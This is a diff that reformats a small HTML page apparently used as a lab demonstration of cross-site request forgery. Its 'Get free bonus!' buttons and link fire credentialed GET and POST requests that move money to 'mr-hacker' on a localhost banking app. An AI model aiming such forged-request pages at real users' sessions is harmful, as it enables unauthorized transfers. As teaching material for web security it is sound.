@@ -1,56 +1,63 @@
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>App</title>
-  <style>
-    input {
-      display: block;
-    }
+  <head>
+    <meta charset="utf-8" />
+    <title>App</title>
+    <style>
+      input {
+        display: block;
+      }
 
-    input[type="button"],
-    button {
-      margin-top: 10px;
-    }
-  </style>
-</head>
+      input[type='button'],
+      button {
+        margin-top: 10px;
+      }
+    </style>
+  </head>
 
-<body>
-  <h2>Get free bonus!</h2>
-  <button onclick="transferGET()">FREE Smartphone (GET)</button>
+  <body>
+    <h2>Get free bonus!</h2>
+    <button onclick="transferGET()">
+      FREE Smartphone (GET) http://127.0.0.1/transfer/mr-hacker/10000
+    </button>
 
-  <h2>Get free bonus!</h2>
-  <button onclick="transferPOST()">FREE Smartphone (POST)</button>
+    <h2>Get free bonus!</h2>
+    <button onclick="transferPOST()">
+      FREE Smartphone (POST) http://127.0.0.1/transfer
+    </button>
 
-  <h2>Get MORE free bonus!</h2>
-  <a href="http://127.0.0.1/transfer/mr-hacker/10000">GET HERE</a>
-</body>
+    <h2>
+      Get MORE free bonus! link:
+      href="http://127.0.0.1/transfer/mr-hacker/10000"
+    </h2>
+    <a href="http://127.0.0.1/transfer/mr-hacker/10000">GET HERE</a>
+  </body>
 
-<script>
-  function transferGET() {
-    fetch('http://127.0.0.1/transfer/mr-hacker/10000', {credentials: "include"})
-      .then((response) => {
-        return response.json();
+  <script>
+    function transferGET() {
+      fetch('http://127.0.0.1/transfer/mr-hacker/10000', {
+        credentials: 'include'
       })
-      .then((data) => {
-        console.log(data);
-      });
-  }
-  
-  function transferPOST() {
-    fetch('http://127.0.0.1/transfer', {
+        .then(response => {
+          return response.json();
+        })
+        .then(data => {
+          console.log(data);
+        });
+    }
+
+    function transferPOST() {
+      fetch('http://127.0.0.1/transfer', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: 'receiver=MrHacker&amount=100000',
-        credentials: "include"
+        credentials: 'include'
       })
-      .then((response) => {
-        return response.json();
-      })
-      .then((data) => {
-        console.log(data);
-      });
-  }
-  
-</script>
-
+        .then(response => {
+          return response.json();
+        })
+        .then(data => {
+          console.log(data);
+        });
+    }
+  </script>
 </html>
